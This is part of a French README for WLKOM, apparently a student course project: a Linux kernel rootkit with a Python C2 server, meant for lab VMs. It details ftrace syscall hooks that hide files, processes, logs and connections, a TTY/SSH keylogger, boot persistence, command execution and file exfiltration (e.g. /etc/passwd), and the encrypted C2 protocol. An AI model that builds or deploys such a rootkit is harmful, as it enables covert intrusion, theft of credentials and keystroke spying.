       │
       ▼
  ┌──────────────────────┐
  │ Ftrace intercepte    │
  │ l'appel et redirige  │──► hk_getdents64() (notre hook)
  │ vers notre fonction  │         │
  └──────────────────────┘         │  filtre les entries
                                   │  contenant "wlkom"/"zroot"
                                   ▼
                              Resultat filtre
                              retourne a l'userland
```

**Resolution des symboles :** Le rootkit utilise `kprobe` pour trouver l'adresse des fonctions noyau a hooker (`wlkom_ksym()`), car `kallsyms_lookup_name` n'est plus exporte depuis Linux 5.7.

### 11.2 - Dissimulation complete

```
┌─────────────────────────────────────────────────────────────────┐
│                  MECANISMES DE DISSIMULATION                    │
├─────────────────────┬───────────────────────────────────────────┤
│ Ce qu'on cache      │ Comment                                   │
├─────────────────────┼───────────────────────────────────────────┤
│ Module (lsmod)      │ list_del() sur THIS_MODULE->list          │
│ Module (/sys)       │ kobject_del() sur mkobj.kobj              │
│ Fichiers (ls)       │ Hook getdents64, filtre noms              │
│                     │ contenant "wlkom" ou "zroot"              │
│ Logs (dmesg)        │ Hook read, filtre lignes contenant        │
│                     │ "wlkom" ou "zroot"                        │
│ Reseau (ss/netstat) │ Hook recvmsg sur NETLINK_SOCK_DIAG,      │
│                     │ filtre par port C2                        │
│ Reseau (/proc/net)  │ Hook read, filtre hex du port             │
│                     │ (0x270F = 9999) et IP C2                  │
│ Processus (ps)      │ Hook getdents64 sur /proc, filtre         │
│                     │ les PIDs dans hidden_pids[]               │
└─────────────────────┴───────────────────────────────────────────┘
```

### 11.3 - Keylogger

Le keylogger utilise **deux mecanismes complementaires** :

| Mecanisme | Cible | Methode |
|:---|:---|:---|
| `keyboard_notifier` | Console physique (TTY) | Callback noyau sur KBD_KEYSYM |
| Hook `sys_read` | Sessions SSH (PTY) | Intercepte les reads sur les terminaux (major 4 = /dev/ttyN, major 136 = /dev/pts/N) |

Le buffer de capture est un **ring buffer** de 4096 octets. Il est vide a chaque lecture (`KEYLOG_DUMP`).

### 11.4 - Protocole de communication

**Authentification :**

```
Rootkit ──── "AUTH_REQUIRED\n" ────► C2
Rootkit ◄─── "wlkom2024\n" ────────  C2
Rootkit ──── "AUTH_OK\n" ──────────► C2    (ou "AUTH_FAIL\n")
```

**Execution de commande :**

```
Rootkit ◄─── "ls -la /etc\n" ──────  C2
Rootkit ──── "<sortie commande>" ──► C2
```

**Download (victime vers attaquant) :**

```
Rootkit ◄─── "DOWNLOAD:/etc/passwd\n" ──  C2
Rootkit ──── "FILE:/etc/passwd:1547\n" ─► C2
Rootkit ──── <donnees par chunks 4K> ───► C2
Rootkit ──── "EOF\n" ──────────────────► C2
```

**Upload (attaquant vers victime) :**

```
Rootkit ◄─── "UPLOAD:/tmp/payload\n" ────  C2
Rootkit ◄─── "4096\n" (taille) ──────────  C2
Rootkit ──── "READY\n" ────────────────► C2
Rootkit ◄─── <donnees par chunks> ───────  C2
Rootkit ──── "UPLOAD_OK\n" ────────────► C2
```

### 11.5 - Commandes speciales du rootkit

| Commande | Reponse | Description |
|:---|:---|:---|
| `DOWNLOAD:<chemin>` | `FILE:...` + data + `EOF` | Telecharger un fichier |
| `UPLOAD:<chemin>` | `UPLOAD_OK` | Recevoir un fichier |
| `HIDE_PID:<pid>` | `PID_HIDDEN` | Cacher un processus |
| `UNHIDE_PID:<pid>` | `PID_UNHIDDEN` | Montrer un processus |
| `LIST_HIDDEN_PIDS` | `<liste pids>` | Lister les PIDs caches |
| `KEYLOG_START` | `KEYLOGGER_ON` | Activer le keylogger |
| `KEYLOG_STOP` | `KEYLOGGER_OFF` | Desactiver le keylogger |
| `KEYLOG_DUMP` | `<buffer>` | Lire et vider le buffer |
| `KEYLOG_STATUS` | `KEYLOGGER:ON/OFF` | Etat du keylogger |
| *toute autre commande* | *sortie de la commande* | Execute via `/bin/sh -c` |

---

## 12 - Fonctionnalites du C2

### 12.1 - Architecture

Le C2 est un serveur web ecrit en **Python 3** :

| Composant | Role | Version |
|:---|:---|:---|
| FastAPI | Framework web asynchrone | 0.136.1 |
| Uvicorn | Serveur ASGI | 0.47.0 |
| WebSocket | Communication temps reel navigateur | 16.0 |
| Cryptography | Derivation de cle + chiffrement | 38.0.4 |

> Le C2 tient dans **un seul fichier** : `c2.py` (~3500 lignes). Le HTML, CSS et JavaScript sont embarques directement dans le Python.

### 12.2 - Ports utilises

| Port | Protocole | Direction | Usage |
|:---|:---|:---|:---|
| **8080** | HTTP + WebSocket | Navigateur → C2 | Interface web |
| **9999** | TCP (chiffre) | Rootkit → C2 | Connexion persistante (listener) |
| **9998** | TCP (chiffre) | C2 → Rootkit | Envoi de commandes (writer) |

### 12.3 - API REST

| Endpoint | Methode | Auth | Description |
|:---|:---:|:---:|:---|
| `/` | GET | Non | Page web complete du C2 |
| `/api/login` | POST | Non | Authentification (retourne un token) |
| `/api/logout` | POST | Oui | Deconnexion (supprime le token) |
| `/api/status` | GET | Non | Etat du C2 et du rootkit |
| `/api/exec` | POST | Oui | Executer une commande sur la victime |
| `/api/upload` | POST | Oui | Upload fichier vers la victime |
| `/api/dl/<fichier>` | GET | Non | Telecharger un fichier depuis le C2 |
| `/api/reconnect-rk` | POST | Oui | Forcer la reconnexion du rootkit |
| `/api/restart-c2` | POST | Oui | Redemarrer le serveur C2 |
| `/api/change-password` | POST | Oui | Changer le mot de passe plateforme |
| `/ws` | WebSocket | Non | Flux temps reel (logs, output, events) |

---

## 13 - Architecture technique

### 13.1 - Structure du code source du rootkit

`wlkom.c` — 1166 lignes de C

```
 Lignes  │ Section
─────────┼──────────────────────────────────────────────
   1-33  │ Includes, MODULE_* macros, parametres
  34-52  │ Variables globales (socket, thread, PID hiding, keylogger)
  64-73  │ Constantes crypto (ChaCha20-Poly1305)
  74-141 │ Infrastructure ftrace (resolution symboles, install/remove hook)
 143-221 │ Hook getdents64 (cacher fichiers + PIDs)
 228-376 │ Hook read (filtrer lignes + capturer TTY/keylogger)
 378-527 │ Hook recvmsg (cacher connexion de ss/netstat)
 529-592 │ Keylogger (keyboard_notifier + dump)
 594-731 │ Reseau TCP (send/recv chiffre, connexion C2)
 752-803 │ Crypto (SHA-256, derivation cle ChaCha20)
 805-879 │ Execution de commandes (call_usermodehelper)
 881-951 │ Download / Upload fichiers
 953-982 │ Persistence (copie module + config boot)
 984-992 │ Dissimulation module (list_del + kobject_del)
 994-1141│ Thread C2 principal (boucle connexion + commandes)
1143-1166│ Init / Exit module
```

### 13.2 - Flux d'execution complet

```
insmod wlkom.ko pw_hash=... c2_ip=... c2_port=...
  │
  ▼
wlkom_init()
  │
  └──► kthread_run(c2_thread_fn)
         │
         │  Phase d'initialisation (2s apres chargement) :
         │
         ├── set_persistence()      Copie zroot.ko + config modprobe
         ├── hide_module()          list_del + kobject_del
         ├── hide_files_init()      Installe hook getdents64
         ├── hide_lines_init()      Installe hook read
         ├── crypto_derive_key()    Derive cle ChaCha20 depuis pw_hash
         ├── net_hide_init()        Prepare hex pour filtrage /proc/net/tcp
         ├── hide_ss_init()         Installe hook recvmsg
         ├── keylogger_start()      Register keyboard_notifier
         ├── auto-hide kthread PID
         │
         │  Boucle principale (infinie) :
         │
         ├── Si pas connecte :
         │     └── connect_to_c2()  TCP vers c2_ip:c2_port
         │     └── Envoie "AUTH_REQUIRED\n"
         │     └── Si echec : attend 5s et reessaie
         │
         ├── Recoit message (non-bloquant, 200ms timeout) :
         │
         ├── Si pas authentifie :
         │     └── check_password() → "AUTH_OK\n" ou "AUTH_FAIL\n"
         │
         └── Si authentifie :
               ├── "DOWNLOAD:..." → do_download()
               ├── "UPLOAD:..."   → do_upload()
               ├── "HIDE_PID:..." → ajoute a hidden_pids[]
               ├── "KEYLOG_*"     → start/stop/dump/status
               └── <autre>        → exec_cmd()
```

---

## 14 - Securite et chiffrement

### 14.1 - ChaCha20-Poly1305 (AEAD)

Toutes les communications rootkit ↔ C2 sont chiffrees avec **ChaCha20-Poly1305** :

| Propriete | Valeur |
|:---|:---|
| Algorithme | ChaCha20 (chiffrement) + Poly1305 (authentification) |
| Type | AEAD (Authenticated Encryption with Associated Data) |
| Taille de cle | 256 bits (32 octets) |
| Taille du nonce | 64 bits (8 octets) — compteur incrementant |
| Taille du tag | 128 bits (16 octets) |

> **Pourquoi ChaCha20 ?** C'est l'alternative recommandee a AES-GCM. Il est disponible nativement dans le noyau Linux (`crypto/chacha20poly1305.h`) et en Python (`cryptography`).

### 14.2 - Derivation de la cle

La cle n'est **jamais transmise** sur le reseau. Les deux cotes la derivent independamment :

```
Cle = SHA-256( "wlkom_crypto_" + pw_hash )
```

| Cote | Calcul | Bibliotheque |
|:---|:---|:---|
| Rootkit (noyau) | `compute_sha256("wlkom_crypto_" + pw_hash, crypto_key)` | `<crypto/hash.h>` |
| C2 (Python) | `hashlib.sha256(b"wlkom_crypto_" + pw_hash).digest()` | `hashlib` |

### 14.3 - Format des trames

Chaque message envoye sur le reseau a ce format :

```
┌───────────────┬──────────────┬─────────────────────────────────┐
│ 4 octets      │ 8 octets     │ N octets + 16 octets            │
│ Taille (BE)   │ Nonce (LE)   │ Texte chiffre   │  Tag Poly1305 │
│               │ (compteur)   │ (ChaCha20)      │  (MAC 128-bit)│
└───────────────┴──────────────┴─────────────────────────────────┘
        │                │                    │
        │                │                    └── Integrite : si un
        │                │                        seul bit est modifie,
        │                │                        le dechiffrement echoue
        │                │
        │                └── Nonce unique par message (compteur 64-bit)
        │                    Empeche les attaques par rejeu
        │
        └── Taille du payload en big-endian
            Permet de lire le message en entier avant dechiffrement
```

### 14.4 - Double authentification

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  NIVEAU 1 : Plateforme web                              │
│  ─────────────────────────                               │
│  Mot de passe : "zerotrust" (modifiable)                 │
│  Protection : 3 tentatives → lock 30s                    │
│  Session : token aleatoire, expire apres 1h              │
│  Stockage : sessionStorage (cote navigateur)             │
│                                                          │
│  ┌──────────────────────────────────────────────────┐    │
│  │                                                  │    │
│  │  NIVEAU 2 : Rootkit                             │    │
│  │  ──────────────────                              │    │
│  │  Mot de passe : choisi au chargement du module   │    │
│  │  Verification : SHA-256 (cote noyau)             │    │
│  │  Transport : canal chiffre ChaCha20-Poly1305     │    │
│  │  Echec : deconnexion + reconnexion dans 5s       │    │
│  │                                                  │    │
│  └──────────────────────────────────────────────────┘    │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## 15 - Depannage

### Le rootkit ne se connecte pas au C2

| Verification | Commande | Attendu |
|:---|:---|:---|
| C2 lance ? | `ss -tlnp \| grep 9999` (sur attaquant) | Ligne avec LISTEN |
| Reseau OK ? | `ping -c 1 192.168.122.96` (depuis victime) | 0% packet loss |
| Bon IP ? | Verifier `c2_ip` passe a `insmod` | IP de l'attaquant |
| Logs C2 | `cat /tmp/c2.log` (sur attaquant) | Messages d'erreur ? |

### L'interface web ne se charge pas

| Verification | Commande | Attendu |
|:---|:---|:---|
| C2 ecoute sur 8080 ? | `ss -tlnp \| grep 8080` (sur attaquant) | Ligne avec LISTEN |
| Bonne URL ? | `http://<IP_ATTAQUANT>:8080` | Page de login |
| Firewall ? | `iptables -L -n` (sur attaquant) | Pas de regle bloquante |

### Le rootkit ne compile pas

| Verification | Commande | Attendu |
|:---|:---|:---|
| Headers installes ? | `ls /lib/modules/$(uname -r)/build/Makefile` | Le fichier existe |
| GCC installe ? | `gcc --version` | gcc 12.x |
| Make installe ? | `make --version` | GNU Make 4.x |
| Si headers manquants | `apt install linux-headers-$(uname -r)` | Installation OK |

### Le rootkit ne persiste pas apres reboot

| Verification | Commande |
|:---|:---|
| Fichier module copie ? | `ls /lib/modules/$(uname -r)/extra/zroot.ko` |
| Config auto-load ? | `cat /etc/modules-load.d/zroot.conf` |
| Config parametres ? | `cat /etc/modprobe.d/zroot.conf` |
| Logs de boot | `journalctl -b \| grep -i "zroot\|module"` |

> **Note** : ces fichiers sont normalement caches par le rootkit. Verifiez-les **avant** le premier chargement ou depuis un live USB.

### Desinstallation manuelle du rootkit

Si le rootkit est charge, il bloque `rmmod`. Pour le desinstaller :

**Methode 1** — Via le panneau Deploy de l'interface web (bouton "Uninstall")

**Methode 2** — Manuellement :

1. Redemarrez la VM en editant GRUB : ajoutez `module_blacklist=zroot` a la ligne de boot
2. Une fois demarree sans le rootkit :
   ```bash
   rm -f /lib/modules/$(uname -r)/extra/zroot.ko
   rm -f /etc/modules-load.d/zroot.conf
   rm -f /etc/modprobe.d/zroot.conf
   depmod -a
   ```
3. Redemarrez normalement

---

## 16 - Structure du projet

```
wlkom/
│
├── AUTHORS                          Login EPITA de l'auteur
├── README.md                        Ce fichier (documentation complete)
├── TODO                             Fonctionnalites done + futures
│
├── screenshots/                     Captures d'ecran de l'interface et des VMs
│
├── rootkit/
│   ├── wlkom.c                      Code source du rootkit (1166 lignes C)
│   ├── wlkom_commented.c            Version commentee (explications detaillees + glossaire)
│   ├── Makefile                     Compilation du module noyau
│   ├── ssh_victim.sh                Raccourci SSH vers la victime
│   └── ssh_attacker.sh              Raccourci SSH vers l'attaquant
│
└── attacking_program/
    ├── c2.py                        Serveur C2 complet (~3500 lignes Python)
    │                                HTML + CSS + JS embarques
    └── c2_commented.py              Version commentee du backend (+ glossaire)
```

### Dependances completes

**VM Victime** (compilation + execution du rootkit) :

| Paquet | Version | Installation |
|:---|:---|:---|
| build-essential | 12.9 | `apt install build-essential` |
| linux-headers | 6.1.0-44 | `apt install linux-headers-$(uname -r)` |
| gcc | 12.2.0 | (inclus dans build-essential) |
| make | 4.3 | (inclus dans build-essential) |

**VM Attaquante** (serveur C2) :

| Paquet | Version | Installation |
|:---|:---|:---|
| python3 | 3.11.2 | `apt install python3 python3-venv` |
| fastapi | 0.136.1 | `pip install fastapi` |
| uvicorn | 0.47.0 | `pip install uvicorn[standard]` |
| websockets | 16.0 | `pip install websockets` |
| cryptography | 38.0.4 | `pip install cryptography` |

---

<p align="center">
  <b>WLKOM</b> — Wild Linux Kernel Object Module<br>
  Projet EPITA SYS2 — APPING1<br>
  <i>yazid.tarmoul</i>
</p>
